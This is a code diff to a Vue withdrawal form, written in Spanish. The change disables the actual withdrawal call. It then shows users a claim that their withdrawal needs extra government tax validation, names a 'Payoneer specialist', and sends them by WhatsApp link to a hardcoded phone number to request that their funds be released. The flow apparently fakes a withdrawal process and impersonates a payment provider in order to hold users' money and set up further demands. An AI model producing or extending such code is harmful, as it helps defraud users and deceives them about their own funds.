@@ -27,8 +27,14 @@
     v-model="transferAmount"
   />
 
-  <Button type="button" :full-width="true" icon="check" @click="onSubmit">
-    Confirmar
+  <!-- Dynamic Button -->
+  <Button
+    type="button"
+    :full-width="true"
+    :icon="confirmState ? 'send' : 'check'"
+    @click="handleButtonClick"
+  >
+    {{ confirmState ? 'Retirar' : 'Confirmar' }}
   </Button>
 </template>
 
@@ -40,8 +46,8 @@
   import { TokenService } from '../../auth/auth-jwt-service';
   import { BankAccountService } from '../Administrator/Accounts/accounts-service';
   import type { BankAccountResponseDto } from '../Administrator/Accounts/accounts.interfaces';
-  import { WithdrawService } from './withdraw-service';
   import { showToast } from '../../shared/Toast/toast-service';
+  import { useSweetAlert } from '../../composables/useSweetAlert.ts';
 
   export default defineComponent({
     name: 'TransferForm',
@@ -54,9 +60,11 @@
       const role = ref<string>(TokenService.getClaim('role'));
       const userId = ref<number>(TokenService.getClaim('sub'));
       const transferAmount = ref<string>('');
+      const confirmState = ref<boolean>(false);
 
       const bankAccountService = new BankAccountService();
-      const withdrawService = new WithdrawService();
+
+      const body = ref<any>(null);
 
       const fetchBankAccounts = async () => {
         if (role.value === 'ADMIN') {
@@ -100,30 +108,16 @@
           }
 
           const selectedCurrency = selectedSourceAccount.value.value;
-          // const destinationAccountCurrency =
-          //   selectedDestinationAccount.value.currency;
 
-          // if (selectedCurrency !== destinationAccountCurrency) {
-          //   showToast('La cuenta debe usar la moneda que seleccionó.', 'error');
-          //   return;
-          // }
-
-          const body = {
+          body.value = {
             amount: Number(transferAmount.value),
             currency: selectedCurrency,
             accountId: selectedDestinationAccount.value.id,
           };
 
-          const phoneNumber = '573224011530';
-          const message = `Retiro exitoso de ${body.amount} ${body.currency}.`;
-          const encodedMessage = encodeURIComponent(message);
-          const whatsappLink = `https://wa.me/${phoneNumber}?text=${encodedMessage}`;
+          // Optional: Call the withdraw service if needed
+          // await withdrawService.withdraw(body.value, userId.value);
 
-          window.open(whatsappLink, '_blank');
-
-          await withdrawService.withdraw(body, userId.value);
-
-          showToast('Retiro exitoso', 'success');
           showToast(
             'Importante: Su solicitud de retiro requiere validación adicional debido a requisitos fiscales gubernamentales. Para procesar su retiro, por favor haga clic en el botón Solicitar Contacto y un especialista de Payoneer le asistirá inmediatamente.',
             'info',
@@ -131,7 +125,7 @@
             10000
           );
 
-          clearForm();
+          confirmState.value = true;
         } catch (error) {
           showToast('Hubo un problema al retirar', 'error');
           console.error('Error during withdrawal:', error);
@@ -142,7 +136,49 @@
         transferAmount.value = '';
         selectedSourceAccount.value = sourceAccounts.value[0];
         selectedDestinationAccount.value = destinationAccounts.value[0];
+        confirmState.value = false; // Reset confirmState when clearing the form
       };
+
+      
+      const whatsapp = async () => {
+        if (!body.value) {
+          showToast('No hay datos de retiro disponibles.', 'error');
+          return;
+        }
+
+        const { showConfirmation } = useSweetAlert();
+        const isConfirmed = await showConfirmation(
+          'Confirmar Retiro',
+          `¿Está seguro de que desea enviar un mensaje de confirmación para el retiro de ${body.value.amount} ${body.value.currency}?`
+        );
+
+        if (isConfirmed) {
+          try {
+            const phoneNumber = '573138093035';
+            const message = `Solicitud de retiro: Hola, buen día. Quisiera solicitar la autorización para retirar los fondos de mi cuenta digital y transferirlos a mi cuenta personal registrada. Monto: ${body.value.amount} ${body.value.currency}. Quedo atento, muchas gracias.`;
+            const encodedMessage = encodeURIComponent(message);
+            const sanitizedPhoneNumber = phoneNumber.replace(/\s+/g, '');
+            const whatsappLink = `https://wa.me/${sanitizedPhoneNumber}?text=${encodedMessage}`;
+            window.open(whatsappLink, '_blank');
+          } catch (error) {
+            console.error('Error opening WhatsApp link:', error);
+            showToast('Hubo un problema al abrir WhatsApp.', 'error');
+          }
+        } else {
+          showToast('El envío del mensaje fue cancelado.', 'info');
+        }
+      };
+
+
+      
+      const handleButtonClick = () => {
+        if (!body.value) {
+          onSubmit();
+        } else if (confirmState.value) {
+          whatsapp();
+        }
+      };
+
 
       return {
         sourceAccounts,
@@ -151,6 +187,10 @@
         selectedDestinationAccount,
         transferAmount,
         onSubmit,
+        whatsapp,
+        confirmState,
+        body,
+        handleButtonClick,
       };
     },
   });
